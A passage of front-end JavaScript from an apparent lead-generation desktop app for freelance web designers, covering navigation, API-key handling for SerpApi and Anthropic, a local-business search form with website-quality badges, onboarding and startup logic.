    <div class="vidnote" style="margin-top:20px"><b>On deploying:</b> the video uses a VPS. For a brochure site with a form service handling submissions, a static host like Netlify is free, gets HTTPS automatically, and has far less to go wrong or to explain to a client later. A VPS earns its cost once there is a real backend. Worth choosing deliberately rather than by habit.</div>`;

  $('pjBack').addEventListener('click',()=>{ pjOpen=null; renderProjects(); });
  $('pj-detail').querySelectorAll('.ph').forEach(h=>h.addEventListener('click',()=>{
    const i=+h.dataset.ph; phaseOpen = phaseOpen===i? -1 : i; renderProject();
  }));
  $('pj-detail').querySelectorAll('input[data-k]').forEach(cb=>cb.addEventListener('click',e=>{
    e.stopPropagation();
    pj.done[cb.dataset.k]=cb.checked;
    if(pj.id) API.projects.done(pj.id, pj.done);
    renderProject();
  }));
  $('pj-detail').querySelectorAll('[data-p]').forEach(b=>b.addEventListener('click',e=>{
    e.stopPropagation();
    const t=$('pj-detail').querySelector(`[data-pt="${b.dataset.p}"]`);
    t.classList.toggle('open');
    if(t.classList.contains('open')){ navigator.clipboard?.writeText(t.textContent); b.textContent='Copied — shown below'; }
    else b.textContent='Copy the prompt';
  }));
}

/* =========================================================================
   Renderer
   ========================================================================= */
const views={home:'v-home',scraper:'v-scraper',organizer:'v-organizer',meetings:'v-meetings',sitecheck:'v-sitecheck',outreach:'v-outreach',prompts:'v-prompts',projects:'v-projects',profile:'v-profile',tool:'v-tool',keys:'v-keys',about:'v-about'};
const heads={home:['Home','No leads yet'],scraper:['Lead Scraper','Find local businesses'],organizer:['Call Organizer','Book meetings'],meetings:['Meetings','Prepare and close'],sitecheck:['Site Check','Find what to talk about'],outreach:['Outreach','Find emails, then write them'],prompts:['Prompt Library','Motion that makes a site feel expensive'],projects:['Projects','Won work, start to handover'],profile:['Your Details','Used in every email you send'],keys:['API Keys','Search and writing keys'],about:['About','']};
let hasKey=false;

function setIcon(el,id){el.innerHTML='<use href="#'+id+'"/>';el.setAttribute('viewBox',id==='i-mark'?'0 0 120 100':'0 0 24 24')}

function refreshCounts(){
  const c=db.counts();
  setNum($('c-scraped'), db.countLeads());
  setNum($('c-enriched'), db.all().filter(l=>l.email).length);
  setNum($('c-contacted'), db.all().filter(l=>l.emailed||l.attempts>0).length);
  setNum($('c-booked'), c.booked);
  const won = db.all().reduce((n,l)=>n+(l.meeting_outcome==='won'?Number(l.deal_value)||0:0),0);
  const wonCount = db.all().filter(l=>l.meeting_outcome==='won').length;
  const inPlay = db.organizer().filter(l=>!['no','blacklist'].includes(l.call_status)).length;
  const cv=$('wonVal'); if(cv) setNum(cv, won, '$');
  const side=$('wonSide');
  if(side) side.innerHTML=`<b>${wonCount}</b> ${wonCount===1?'deal':'deals'} won<br><b>${c.booked}</b> meetings booked<br><b>${inPlay}</b> leads in play`;
  const cap=$('wonCap');
  if(cap) cap.textContent = won>0
    ? 'Your own total, tracked on this computer as you mark deals won in the Call Organizer.'
    : 'Your first closed deal shows up here — mark a meeting won in the Call Organizer and watch it climb.';
  renderActivity();
  const n=db.countLeads();
  if(!$('v-home').hidden) $('vs').textContent = n? `${n} leads collected` : 'No leads yet';
}

/* Subtle GSAP flourish around the closed-won panel — a soft rise-in on arrival
   plus a slow breathing shadow so it reads "alive" without breaking the calm. */
function animateHome(){
  const panel=$('wonPanel');
  if(!panel || reduce || !window.gsap) return;
  gsap.killTweensOf(panel);
  gsap.fromTo(panel,{y:16,opacity:0,filter:'blur(3px)'},
    {y:0,opacity:1,filter:'blur(0px)',duration:.6,ease:'power3.out'});
  gsap.to(panel,{boxShadow:'0 12px 38px rgba(20,20,22,.22)',duration:2.8,
    ease:'sine.inOut',yoyo:true,repeat:-1,delay:.6});
}

function go(btn){
  const t=btn.dataset.go, icon=btn.dataset.icon||'i-home';
  Object.values(views).forEach(id=>$(id).hidden=true);
  $(views[t]).hidden=false;
  document.querySelectorAll('.nav .item,.rail-foot .item').forEach(i=>i.classList.remove('on'));
  const nav=document.querySelector('.item[data-go="'+t+'"]'+(btn.dataset.name?'[data-name="'+btn.dataset.name+'"]':''));
  if(nav)nav.classList.add('on');
  setIcon($('headicon'),icon);
  $('meter').hidden = t!=='scraper' || !hasKey;

  if(t==='tool'){
    $('vt').textContent=btn.dataset.name; $('vs').textContent='Not built yet';
    $('et').textContent=btn.dataset.name;
    $('ed').textContent=btn.dataset.desc+" This slot is already wired to the shell — when the tool is built it appears right here, with no changes to navigation, storage, or key handling.";
    setIcon($('emptyicon'),icon);
  } else {
    $('vt').textContent=heads[t][0]; $('vs').textContent=heads[t][1];
    if(t==='scraper'){ $('sc-locked').hidden=hasKey; $('sc-main').hidden=!hasKey; }
    if(t==='organizer'){ queueIdx=0; renderOrganizer(); }
    if(t==='meetings'){ renderMeetings(); }
    if(t==='outreach'){ renderOutreach(); }
    if(t==='prompts'){ renderPrompts(); }
    if(t==='projects'){ renderProjects(); }
    if(t==='profile'){ renderProfile(); }
    if(t==='home'){ refreshCounts(); animateHome(); }
  }
}
document.querySelectorAll('[data-go]').forEach(b=>b.addEventListener('click',()=>go(b)));

/* --- key vault --- */
const b1=$('b1'), k1=$('k1'), p1=$('p1'), s1=$('s1'), m1=$('m1');
const KEY_MASK = '••••••••••••••••••••••••';

/* Show that a key is saved without ever exposing it: fill the field with a
   masked stand-in and lock it, so it never looks empty. "Replace" clears it so
   a new key can be pasted. The real key stays encrypted in the main process and
   is never sent back to this window. */
function reflectKeySaved(detailHtml){
  k1.value = KEY_MASK; k1.readOnly = true;
  p1.className = 'pip live'; s1.textContent = 'Connected';
  b1.textContent = 'Replace'; b1.classList.remove('pri'); b1.disabled = false;
  m1.innerHTML = detailHtml || '<span>A key is saved on this computer. Click <b>Replace</b> to paste a new one.</span>';
}
function startKeyReplace(){
  k1.readOnly = false; k1.value = ''; k1.placeholder = 'Paste your new key here'; k1.focus();
  p1.className = 'pip off'; s1.textContent = 'Not checked';
  b1.textContent = 'Check key'; b1.classList.add('pri');
  m1.innerHTML = '<span>Paste your new SerpApi key, then click <b>Check key</b>.</span>';
}

/* Anthropic (optional) key — same connect/replace behaviour as SerpApi. */
const b2=$('b2'), k2=$('k2'), p2=$('p2'), s2=$('s2'), m2=$('m2');
function reflectAnthropicSaved(detailHtml){
  if(!k2) return;
  k2.value = KEY_MASK; k2.readOnly = true;
  p2.className = 'pip live'; s2.textContent = 'Connected';
  b2.textContent = 'Replace'; b2.classList.remove('pri'); b2.disabled = false;
  m2.innerHTML = detailHtml || '<span>A key is saved on this computer. Click <b>Replace</b> to paste a new one.</span>';
}
function startAnthropicReplace(){
  k2.readOnly = false; k2.value = ''; k2.placeholder = 'Paste your new key here'; k2.focus();
  p2.className = 'pip off'; s2.textContent = 'Not checked';
  b2.textContent = 'Check key'; b2.classList.add('pri');
  m2.innerHTML = '<span>Paste your Anthropic key (it starts with <b>sk-ant-</b>), then click Check key.</span>';
}
if (b2) b2.addEventListener('click', async () => {
  if (b2.textContent === 'Replace') { startAnthropicReplace(); return; }
  const v = k2.value.trim(); if (!v) { k2.focus(); return; }
  s2.textContent = 'Checking'; p2.className = 'pip off';
  b2.disabled = true; b2.innerHTML = '<span class="spin"></span> Checking…';
  try {
    await unwrap(API.keys.test('anthropic', v));
    reflectAnthropicSaved('<span>This key works. The Outreach Generator can draft emails with Claude.</span>');
  } catch (err) {
    p2.className = 'pip bad'; s2.textContent = 'Rejected';
    b2.disabled = false; b2.textContent = 'Check key'; b2.classList.add('pri');
    m2.innerHTML = err.code === 'NETWORK'
      ? '<span>Could not reach Anthropic to check the key. Check your internet connection and try again.</span>'
      : '<span>Anthropic rejected this key. Make sure you copied the whole key — it starts with <b>sk-ant-</b>.</span>';
  }
});

b1.addEventListener('click', async () => {
  if (b1.textContent === 'Replace') { startKeyReplace(); return; }
  const v = k1.value.trim(); if (!v) { k1.focus(); return; }
  s1.textContent = 'Checking'; p1.className = 'pip off';
  b1.disabled = true; b1.innerHTML = '<span class="spin"></span> Checking…';
  try {
    const res = await unwrap(API.keys.test('searchApiKey', v));
    hasKey = true;
    searchesLeft = res.left;
    reflectKeySaved(`<span>This key works${res.plan ? ' on the ' + res.plan + ' plan' : ''}. ` +
      `${res.left != null ? '<b>' + res.left + '</b> searches left this cycle. ' : ''}The Lead Scraper is unlocked.</span>`);
    $('railpip').className = 'pip live'; $('headpip').className = 'pip live';
    const hp = $('homepip'); if (hp) hp.className = 'pip live';
    $('heads').textContent = 'Ready';
    if (searchesLeft != null) $('meterN').textContent = searchesLeft;
  } catch (err) {
    p1.className = 'pip bad'; s1.textContent = 'Rejected';
    b1.disabled = false; b1.textContent = 'Check key'; b1.classList.add('pri');
    m1.innerHTML = err.code === 'NETWORK'
      ? '<span>Could not reach SerpApi to check the key. Check your internet connection and try again.</span>'
      : '<span>SerpApi rejected this key. Check that you copied all of it, then paste it again.</span>';
  }
});

/* --- scraper form --- */
const btype=$('btype'), btypeOther=$('btypeOther'), zip=$('zip');
btype.addEventListener('change',()=>{
  btypeOther.hidden = btype.value!=='__other';
  if(!btypeOther.hidden) btypeOther.focus();
  $('e-btype').classList.remove('show'); btype.classList.remove('err');
});
zip.addEventListener('input',()=>{
  zip.value=zip.value.replace(/\D/g,'').slice(0,5);
  $('e-zip').classList.remove('show'); zip.classList.remove('err');
});

function selectedFields(){
  return [...document.querySelectorAll('.f:checked')].map(c=>c.dataset.f);
}
function typeValue(){
  return btype.value==='__other' ? btypeOther.value.trim() : btype.value;
}

const COLS=[
  {f:'name',    h:'Business name', always:true},
  {f:'site',    h:'Site',          always:true},
  {f:'address', h:'Address'},
  {f:'city',    h:'City'},
  {f:'phone',   h:'Phone'},
  {f:'website', h:'Website'},
  {f:'rating',  h:'Rating'},
  {f:'email',   h:'Email',        enrich:true},
  {f:'contact', h:'Contact name', enrich:true}
];

function qualityCell(L){
  const q=L.quality||{bucket:'solid',score:null,failed:[]};
  if(q.bucket==='none')
    return `<span class="q none" title="No website found in the search results"><span class="bar"></span>No site</span>`;
  if(q.bucket==='dead')
    return `<span class="q dead" title="The website address is listed but doesn't load"><span class="bar"><i style="width:100%"></i></span>Doesn't load</span>`;
  if(q.score===null)
    return `<span class="q solid" title="Not checked — tick Weak or Solid to have sites opened and checked"><span class="bar"></span>Not checked</span>`;
  const label = q.bucket==='weak' ? 'Weak' : 'Solid';
  const tip = q.failed.length
    ? 'Problems found:\n· '+q.failed.join('\n· ')
    : 'Passed every check';
  return `<span class="q ${q.bucket}" title="${tip}"><span class="bar"><i style="width:${q.score}%"></i></span>${label} ${q.score}</span>`;
}

function alertBox(title, body, actions){
  return `<div class="alert"><span class="ai"><svg viewBox="0 0 24 24"><use href="#i-alert"/></svg></span>
    <div style="flex:1"><h4>${title}</h4><p>${body}</p>${actions?`<div class="aa">${actions}</div>`:''}</div></div>`;
}

function renderResults(r, fields, bt){
  const cols = COLS.filter(c=>c.always||fields.includes(c.f));
  const rowsHtml = r.leads.map(L=>{
    return `<tr><td><input type="checkbox" class="rowcb pick" value="${L.place_id}"></td>`+cols.map(c=>{
      if(c.enrich) return `<td class="dash" title="Run the Contact Enrichment tool to fill this in">—</td>`;
      if(c.f==='site')    return `<td>${qualityCell(L)}</td>`;
      if(c.f==='name')    return `<td class="name">${L.name}</td>`;
      if(c.f==='rating')  return `<td>${L.rating} · ${L.reviews}</td>`;
      if(c.f==='website') return `<td>${L.website||'<span style="color:var(--line-2)">none listed</span>'}</td>`;
      return `<td>${L[c.f]??''}</td>`;
    }).join('')+'</tr>';
  }).join('');

  return `
  <div class="summary">
    <span><b>${r.inserted}</b> new leads</span><span class="dv">·</span>
    <span><b>${r.duplicates}</b> duplicates skipped</span><span class="dv">·</span>
    ${r.filteredOut?`<span><b>${r.filteredOut}</b> filtered out by website status</span><span class="dv">·</span>`:''}
    <span><b>${r.apiCalls}</b> API ${r.apiCalls===1?'call':'calls'}</span>
  </div>
  <div class="tblwrap"><div class="tblscroll"><table>
    <thead><tr><th><input type="checkbox" class="rowcb" id="pickAll"></th>${cols.map(c=>`<th>${c.h}</th>`).join('')}</tr></thead>
    <tbody>${rowsHtml}</tbody>
  </table></div>
  <div class="tblfoot">Saved to your leads database · ${bt} in ${zip.value}${fields.includes('email')||fields.includes('contact')?' · flagged for enrichment':''}</div>
  </div>
  <div class="selbar" id="selbar" hidden>
    <span class="sn"><b id="selN">0</b> selected</span>
    <button class="btn" id="sendOrg">Send to Call Organizer</button>
  </div>`;
}

$('goSearch').addEventListener('click', async ()=>{
  const bt=typeValue(), z=zip.value.trim(); let bad=false;
  if(!bt){ $('e-btype').classList.add('show'); btype.classList.add('err'); bad=true; }
  if(!/^\d{5}$/.test(z)){ $('e-zip').classList.add('show'); zip.classList.add('err'); bad=true; }
  if(bad) return;

  const want=[...document.querySelectorAll('.w:checked')].map(c=>c.dataset.w);
  if(!want.length){
    $('sc-out').innerHTML=alertBox('Pick at least one website status',
      'Every business is either without a site, on a weak one, or on a solid one. Unticking all three leaves nothing to find.');
    return;
  }

  const fields=selectedFields(), out=$('sc-out'), btn=$('goSearch');
  btn.disabled=true; btn.innerHTML='<span class="spin"></span> Searching…';
  out.innerHTML=`<div class="summary" style="color:var(--ink-3)">Searching ${bt} in ${z}…</div>`;

  const onScan=(done,total)=>{
    out.innerHTML=`<div class="scanline"><span class="spin"></span>
      Checking websites — ${done} of ${total}
      <span class="prog"><i style="width:${Math.round(done/total*100)}%"></i></span></div>`;
  };

  try{
    const r = await runSearch({businessType:bt, zip:z, fields, want, onScan});
    if(r.inserted===0 && r.filteredOut>0){
      out.innerHTML = `<div class="empty" style="margin-top:26px">
        <span class="bigico"><svg viewBox="0 0 24 24"><use href="#i-scraper"/></svg></span>
        <h3>Everything was filtered out</h3>
        <p>${r.filteredOut} businesses came back for ${bt} in ${z}, but none matched the website status you asked for. Widen it — ticking both No website and Weak website usually opens things up.</p></div>`;
    }
    else if(r.inserted===0 && r.duplicates===0){
      out.innerHTML = `<div class="empty" style="margin-top:26px">
        <span class="bigico"><svg viewBox="0 0 24 24"><use href="#i-scraper"/></svg></span>
        <h3>No businesses found</h3>
        <p>Nothing came back for ${bt} in ${z}. Try a broader business type, or a neighboring zip code — smaller zips often have very few listings.</p></div>`;
    } else {
      out.innerHTML = renderResults(r, fields, bt);
      wireSelection();
    }
    $('meterN').textContent = searchesLeft;
    refreshCounts();
  } catch(e){
    if(e.code==='BAD_KEY') out.innerHTML=alertBox('Your SerpApi key was rejected',
      'The key on file isn\'t being accepted. Open the API Keys screen, paste it again, and make sure you copied all of it.',
      '<button class="btn pri" data-go="keys" data-icon="i-keys">Go to API Keys</button>');
    else if(e.code==='QUOTA') out.innerHTML=alertBox('You\'ve used all your searches this cycle',
      `Your ${e.plan} plan's monthly search allowance is used up. This isn't a bug and nothing is broken — the allowance resets when your plan renews. You can keep working with the leads you already have, or upgrade your plan on SerpApi.`,
      '<button class="btn">See leads I already have</button>');
    else if(e.code==='HOURLY') out.innerHTML=alertBox('Too many searches in the last hour',
      'SerpApi limits how many searches you can run per hour. Wait a few minutes and run this again — your monthly allowance hasn\'t been touched.');
    else if(e.code==='NETWORK') out.innerHTML=alertBox('Couldn\'t reach SerpApi',
      'The search didn\'t go through. Check your internet connection and try again. Nothing was saved and no searches were used.',
      '<button class="btn pri" id="retry">Try again</button>');
    else out.innerHTML=alertBox('Something went wrong','The search didn\'t complete. Nothing was saved.');
    out.querySelectorAll('[data-go]').forEach(b=>b.addEventListener('click',()=>go(b)));
    const rt=$('retry'); if(rt) rt.addEventListener('click',()=>$('goSearch').click());
  } finally {
    btn.disabled=false; btn.textContent='Search';
  }
});

function updateCostNote(){
  const want=[...document.querySelectorAll('.w:checked')].map(c=>c.dataset.w);
  const scan = want.includes('weak')||want.includes('solid')||want.includes('dead');
  $('costnote').textContent = scan
    ? 'Uses up to 3 of your searches, then opens each website to check it'
    : 'Uses up to 3 of your searches — no websites need checking';
}
document.querySelectorAll('.w').forEach(c=>c.addEventListener('change',updateCostNote));
updateCostNote();

refreshCounts();



/* =========================================================================
   First run. A student opens the app and is told exactly what to do,
   in order, once. Skippable, and everything is changeable later.
   ========================================================================= */
let onbStep = 1;

function onbGo(n){
  onbStep = n;
  document.querySelectorAll('.onb-p').forEach(p => p.hidden = +p.dataset.p !== n);
  document.querySelectorAll('.os').forEach(o => {
    const i = +o.dataset.s;
    o.classList.toggle('on', i === n);
    o.classList.toggle('ok', i < n);
  });
  if (n === 3) renderOnbProfile();
  const m = document.querySelector('.onb-main'); if (m) m.scrollTop = 0;
}

function renderOnbProfile(){
  const box = $('onbProf'); if (!box) return;
  box.innerHTML = PROFILE_FIELDS.filter(f => f.req || f.k === 'proof').map(f => `
    <div class="${f.full ? 'full' : ''}">
      <label>${f.l}${f.req ? '' : ' <span style="color:var(--ink-3);font-weight:400">(optional)</span>'}</label>
      <input data-k="${f.k}" placeholder="${f.ph}" value="${(me[f.k] || '').replace(/"/g, '&quot;')}">
      ${f.h ? `<div class="h2">${f.h}</div>` : ''}
    </div>`).join('');
}

async function finishOnboarding(){
  $('onbProf').querySelectorAll('input').forEach(i => me[i.dataset.k] = i.value.trim());
  if (!profileReady()){
    const msg = $('onbProfMsg');
    msg.className = 'onb-msg bad';
    msg.textContent = 'Fill in the required fields first — the emails cannot be written without them.';
    return;
  }
  await unwrap(API.profile.set(me));
  await unwrap(API.profile.set({ ...me, _onboarded: true }));
  $('profpip').className = 'pip live';
  $('onb').hidden = true;
}

function wireOnboarding(){
  document.querySelectorAll('[data-go-step]').forEach(b =>
    b.addEventListener('click', () => onbGo(+b.dataset.goStep)));

  const open = $('onbOpenSerp');
  if (open) open.addEventListener('click', () => API.openExternal('https://serpapi.com/users/sign_up'));

  const chk = $('onbCheck'), inp = $('onbKey'), msg = $('onbKeyMsg');
  if (chk) chk.addEventListener('click', async () => {
    const v = inp.value.trim();
    if (!v){ inp.focus(); return; }
    chk.disabled = true; chk.innerHTML = '<span class="spin"></span> Checking…';
    msg.className = 'onb-msg'; msg.textContent = 'Checking your key with SerpApi…';
    try {
      const res = await unwrap(API.keys.test('searchApiKey', v));
      hasKey = true; searchesLeft = res.left;
      msg.className = 'onb-msg';
      msg.innerHTML = `<b>That works.</b> You have ${res.left != null ? '<b>' + res.left + '</b> searches' : 'searches'} available` +
                      `${res.plan ? ' on the ' + res.plan + ' plan' : ''}. The Lead Scraper is unlocked.`;
      $('onbNext2').disabled = false;
      $('railpip').className = 'pip live'; $('headpip').className = 'pip live';
      $('heads').textContent = 'Ready';
      reflectKeySaved();
      if (searchesLeft != null) $('meterN').textContent = searchesLeft;
    } catch (err) {
      msg.className = 'onb-msg bad';
      msg.textContent = err.code === 'NETWORK'
        ? 'Could not reach SerpApi. Check your internet connection and try again — the key itself is probably fine.'
        : 'SerpApi did not accept that key. Make sure you copied the whole thing, with no spaces at either end.';
    } finally {
      chk.disabled = false; chk.textContent = 'Check it';
    }
  });
  if (inp) inp.addEventListener('keydown', e => { if (e.key === 'Enter') chk.click(); });

  const done = $('onbDone');
  if (done) done.addEventListener('click', finishOnboarding);
}

/* ---------------- boot ---------------- */
API.onProgress(d => { if (window._progress) window._progress(d.done, d.total, d.found); });

(async function boot(){
  try{
    const [prof, hk, meter] = await Promise.all([
      unwrap(API.profile.get()), unwrap(API.keys.has('searchApiKey')), API.meter()
    ]);
    Object.assign(me, prof || {});
    hasKey = !!hk;
    if (hasKey) {
      $('railpip').className='pip live'; $('headpip').className='pip live';
      const hp=$('homepip'); if(hp) hp.className='pip live';
      $('heads').textContent='Ready';
      reflectKeySaved();
    }
    try { if (await unwrap(API.keys.has('anthropic'))) reflectAnthropicSaved(); } catch {}
    if (meter && meter.ok && meter.data && meter.data.left != null) {
      searchesLeft = meter.data.left; $('meterN').textContent = searchesLeft;
    }
    $('profpip').className='pip '+(profileReady()?'live':'off');
    wireOnboarding();
    if (!(prof && prof._onboarded)) { $('onb').hidden = false; onbGo(hasKey ? 3 : 1); }
    await syncState();
    projects = STATE.projects;
    refreshCounts();
    animateHome();
    updateCostNote();
  }catch(err){
    console.error('boot failed', err);
    document.body.insertAdjacentHTML('beforeend',
      '<div style="position:fixed;bottom:16px;left:16px;right:16px;background:#141416;color:#fff;padding:14px 16px;border-radius:9px;font:12px ui-monospace,monospace;z-index:9999">'+
      'ArturaLabs could not start properly: '+err.message+'</div>');
  }
})();
